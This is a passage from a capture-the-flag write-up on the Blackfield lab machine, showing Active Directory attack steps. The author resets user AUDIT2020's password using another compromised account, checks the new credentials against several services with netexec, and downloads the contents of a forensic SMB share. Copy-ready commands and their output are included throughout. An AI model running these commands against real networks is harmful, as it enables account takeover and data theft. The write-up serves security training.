<p><code>Group Membership</code> of user <code>AUDIT2020</code><br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250809132351.png" /><br />
hm apart from being obviously member of the domain users group, no other group memberships observed</p>
<p>Since i found nothing further interesting about <code>AUDIT2020</code> user, i will proceed to run some queries from bloodhound</p>
<p><code>Shortest Paths to Unconstrained Delegation Systems</code><br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250809132357.png" /><br />
hm this means that user <code>SVC_BACKUP</code> can remotely login to the DC, lets now inspect <code>SVC_BACKUP</code></p>
<p><code>Group Membership</code> of user <code>SVC_BACKUP</code><br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250809132403.png" /><br />
nothing else found about this user, this user could be our next target, BUT lets stop for a minute and think.</p>
<p>Okay the path might not be obvious right now, but lets proceed on doing what we already know, so lets proceed on changing the password for user <code>AUDIT2020</code> as user <code>support</code>.</p>
<h1 id="foothold">Foothold</h1>
<h2 id="password-reset-as-user-support-towards-user-audit2020">Password reset as user <code>support</code> towards user <code>AUDIT2020</code></h2>
<p>There are multiple ways to do this,<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="s1">&#39;10.129.164.18&#39;</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;dc01.blackfield.local&#39;</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;support&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;#00^BlackKnight&#39;</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>password<span class="w"> </span>AUDIT2020<span class="w"> </span>Thebestpass0!
</span></code></pre></div></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Password<span class="w"> </span>changed<span class="w"> </span>successfully!
</span></code></pre></div>
<p>OR via rpc<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;blackfield.local/support%#00^BlackKnight&#39;</span><span class="w"> </span><span class="m">10</span>.129.164.18<span class="w"> </span>-c<span class="w"> </span><span class="err">&#39;</span>setuserinfo2<span class="w"> </span>audit2020<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="s2">&quot;Thebestpass0!&quot;</span>
</span></code></pre></div></p>
<p>now the updated creds are:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>audit2020<span class="w"> </span>
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>Thebestpass0!
</span></code></pre></div></p>
<p>Lets now use my script to bulk check the services to which we can login with those creds:</p>
<p><a href="https://github.com/ch3ckkm8/auto_netexec">ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check</a></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>./auto_netexec_bulk_creds_checker.sh<span class="w"> </span>blackfield.htb<span class="w"> </span><span class="s1">&#39;audit2020&#39;</span><span class="w"> </span><span class="s1">&#39;Thebestpass0!&#39;</span>
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>winrm<span class="w"> </span>port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>winrm<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">5985</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span>
</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">5985</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>BLACKFIELD.local<span class="se">\\</span>audit2020:Thebestpass0!
</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>
</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>smb<span class="w"> </span>port<span class="w"> </span><span class="m">445</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">445</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>smb<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>BLACKFIELD.local<span class="se">\\</span>audit2020:Thebestpass0!<span class="w"> </span>
</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a>
</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ldap<span class="w"> </span>port<span class="w"> </span><span class="m">389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">389</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>ldap<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-34-13"><a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-34-14"><a id="__codelineno-34-14" name="__codelineno-34-14" href="#__codelineno-34-14"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">389</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>BLACKFIELD.local<span class="se">\\</span>audit2020:Thebestpass0!<span class="w"> </span>
</span><span id="__span-34-15"><a id="__codelineno-34-15" name="__codelineno-34-15" href="#__codelineno-34-15"></a>
</span><span id="__span-34-16"><a id="__codelineno-34-16" name="__codelineno-34-16" href="#__codelineno-34-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>rdp<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-34-17"><a id="__codelineno-34-17" name="__codelineno-34-17" href="#__codelineno-34-17"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>rdp<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-34-18"><a id="__codelineno-34-18" name="__codelineno-34-18" href="#__codelineno-34-18"></a>
</span><span id="__span-34-19"><a id="__codelineno-34-19" name="__codelineno-34-19" href="#__codelineno-34-19"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>wmi<span class="w"> </span>port<span class="w"> </span><span class="m">135</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-34-20"><a id="__codelineno-34-20" name="__codelineno-34-20" href="#__codelineno-34-20"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">135</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>wmi<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-34-21"><a id="__codelineno-34-21" name="__codelineno-34-21" href="#__codelineno-34-21"></a>RPC<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">135</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span>
</span><span id="__span-34-22"><a id="__codelineno-34-22" name="__codelineno-34-22" href="#__codelineno-34-22"></a>RPC<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">135</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>BLACKFIELD.local<span class="se">\\</span>audit2020:Thebestpass0!<span class="w"> </span>
</span><span id="__span-34-23"><a id="__codelineno-34-23" name="__codelineno-34-23" href="#__codelineno-34-23"></a>
</span><span id="__span-34-24"><a id="__codelineno-34-24" name="__codelineno-34-24" href="#__codelineno-34-24"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>nfs<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-34-25"><a id="__codelineno-34-25" name="__codelineno-34-25" href="#__codelineno-34-25"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>nfs<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-34-26"><a id="__codelineno-34-26" name="__codelineno-34-26" href="#__codelineno-34-26"></a>
</span><span id="__span-34-27"><a id="__codelineno-34-27" name="__codelineno-34-27" href="#__codelineno-34-27"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ssh<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-34-28"><a id="__codelineno-34-28" name="__codelineno-34-28" href="#__codelineno-34-28"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ssh<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-34-29"><a id="__codelineno-34-29" name="__codelineno-34-29" href="#__codelineno-34-29"></a>
</span><span id="__span-34-30"><a id="__codelineno-34-30" name="__codelineno-34-30" href="#__codelineno-34-30"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>vnc<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-34-31"><a id="__codelineno-34-31" name="__codelineno-34-31" href="#__codelineno-34-31"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>vnc<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-34-32"><a id="__codelineno-34-32" name="__codelineno-34-32" href="#__codelineno-34-32"></a>
</span><span id="__span-34-33"><a id="__codelineno-34-33" name="__codelineno-34-33" href="#__codelineno-34-33"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ftp<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-34-34"><a id="__codelineno-34-34" name="__codelineno-34-34" href="#__codelineno-34-34"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ftp<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-34-35"><a id="__codelineno-34-35" name="__codelineno-34-35" href="#__codelineno-34-35"></a>
</span><span id="__span-34-36"><a id="__codelineno-34-36" name="__codelineno-34-36" href="#__codelineno-34-36"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>mssql<span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-34-37"><a id="__codelineno-34-37" name="__codelineno-34-37" href="#__codelineno-34-37"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>mssql<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>closed
</span></code></pre></div>
<p>According to the output above, with these creds we can login to <code>SMB</code> , <code>LDAP</code> and <code>RPC</code></p>
<p>lets try <code>SMB</code> first</p>
<h2 id="smb-enumeration-with-creds-as-audit2020">SMB Enumeration with creds as <code>AUDIT2020</code></h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>blackfield.htb<span class="w">  </span>-u<span class="w"> </span><span class="s1">&#39;AUDIT2020&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Thebestpass0!&#39;</span><span class="w"> </span>--shares
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="c1">#or</span>
</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>smbmap<span class="w"> </span>-H<span class="w"> </span>blackfield.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;AUDIT2020&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Thebestpass0!&#39;</span>
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>IP:<span class="w"> </span>blackfield.htb:445<span class="w">  </span>Name:<span class="w"> </span>unknown<span class="w">                                           </span>
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="w">        </span>Disk<span class="w">                                                    </span>Permissions<span class="w"> </span>Comment
</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="w">    </span>----<span class="w">                                                    </span>-----------<span class="w"> </span>-------
</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="w">    </span>ADMIN$<span class="w">                                              </span>NO<span class="w"> </span>ACCESS<span class="w">   </span>Remote<span class="w"> </span>Admin
</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="w">    </span>C$<span class="w">                                                  </span>NO<span class="w"> </span>ACCESS<span class="w">   </span>Default<span class="w"> </span>share
</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="w">    </span>forensic<span class="w">                                            </span>READ<span class="w"> </span>ONLY<span class="w">   </span>Forensic<span class="w"> </span>/<span class="w"> </span>Audit<span class="w"> </span>share.
</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="w">    </span>IPC$<span class="w">                                                </span>READ<span class="w"> </span>ONLY<span class="w">   </span>Remote<span class="w"> </span>IPC
</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a><span class="w">    </span>NETLOGON<span class="w">                                            </span>READ<span class="w"> </span>ONLY<span class="w">   </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a><span class="w">    </span>profiles$<span class="w">                                           </span>READ<span class="w"> </span>ONLY<span class="w">   </span>
</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a><span class="w">    </span>SYSVOL<span class="w">                                              </span>READ<span class="w"> </span>ONLY<span class="w">   </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span></code></pre></div>
<p>nice! this user seems to have <code>READ</code> permission over the <code>forensic</code> share, to which we did not have such permission previously. Lets connect with smbclient to start exploring the share</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>smbclient<span class="w"> </span>//blackfield.htb/forensic<span class="w"> </span>-U<span class="w"> </span>audit2020%Thebestpass0!
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>smb:<span class="w"> </span><span class="se">\\</span>&gt;<span class="w"> </span>ls
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">07</span>:03:16<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">07</span>:03:16<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="w">  </span>commands_output<span class="w">                     </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">12</span>:14:37<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="w">  </span>memory_analysis<span class="w">                     </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">15</span>:28:33<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="w">  </span>tools<span class="w">                               </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">07</span>:39:08<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a>
</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="w">        </span><span class="m">5102079</span><span class="w"> </span>blocks<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">4096</span>.<span class="w"> </span><span class="m">1687971</span><span class="w"> </span>blocks<span class="w"> </span>available
</span></code></pre></div>
<p>lets inspect <code>commands_output</code></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>smb:<span class="w"> </span><span class="se">\\</span>&gt;<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>commands_output<span class="se">\\</span>
</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>smb:<span class="w"> </span><span class="se">\\</span>commands_output<span class="se">\\</span>&gt;<span class="w"> </span>ls
</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">12</span>:14:37<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">12</span>:14:37<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="w">  </span>domain_admins.txt<span class="w">                   </span>A<span class="w">      </span><span class="m">528</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">07</span>:00:19<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="w">  </span>domain_groups.txt<span class="w">                   </span>A<span class="w">      </span><span class="m">962</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">06</span>:51:52<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a><span class="w">  </span>domain_users.txt<span class="w">                    </span>A<span class="w">    </span><span class="m">16454</span><span class="w">  </span>Fri<span class="w"> </span>Feb<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:32:17<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-39-8"><a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a><span class="w">  </span>firewall_rules.txt<span class="w">                  </span>A<span class="w">   </span><span class="m">518202</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">06</span>:53:58<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-39-9"><a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a><span class="w">  </span>ipconfig.txt<span class="w">                        </span>A<span class="w">     </span><span class="m">1782</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">06</span>:50:28<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-39-10"><a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a><span class="w">  </span>netstat.txt<span class="w">                         </span>A<span class="w">     </span><span class="m">3842</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">06</span>:51:01<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-39-11"><a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a><span class="w">  </span>route.txt<span class="w">                           </span>A<span class="w">     </span><span class="m">3976</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">06</span>:53:01<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-39-12"><a id="__codelineno-39-12" name="__codelineno-39-12" href="#__codelineno-39-12"></a><span class="w">  </span>systeminfo.txt<span class="w">                      </span>A<span class="w">     </span><span class="m">4550</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">06</span>:56:59<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-39-13"><a id="__codelineno-39-13" name="__codelineno-39-13" href="#__codelineno-39-13"></a><span class="w">  </span>tasklist.txt<span class="w">                        </span>A<span class="w">     </span><span class="m">9990</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">06</span>:54:29<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-39-14"><a id="__codelineno-39-14" name="__codelineno-39-14" href="#__codelineno-39-14"></a>
</span><span id="__span-39-15"><a id="__codelineno-39-15" name="__codelineno-39-15" href="#__codelineno-39-15"></a><span class="w">        </span><span class="m">5102079</span><span class="w"> </span>blocks<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">4096</span>.<span class="w"> </span><span class="m">1687971</span><span class="w"> </span>blocks<span class="w"> </span>available
</span></code></pre></div>
<h3 id="file-inspection">File inspection</h3>
<p>instead of searching manually, lets download all the shares locally to inspect offline</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>blackfield.htb<span class="w">  </span>-u<span class="w"> </span><span class="s1">&#39;AUDIT2020&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Thebestpass0!&#39;</span><span class="w"> </span>-M<span class="w"> </span>spider_plus<span class="w"> </span>-o<span class="w"> </span><span class="nv">DOWNLOAD_FLAG</span><span class="o">=</span>True
</span></code></pre></div>
<p>alright, first lets inspect the <code>commands_output</code> since it has fewer contents</p>
<p><code>domain_admins.txt</code></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>Group<span class="w"> </span>name<span class="w">     </span>Domain<span class="w"> </span>Admins
</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>Comment<span class="w">        </span>Designated<span class="w"> </span>administrators<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>domain
</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>
</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>Members
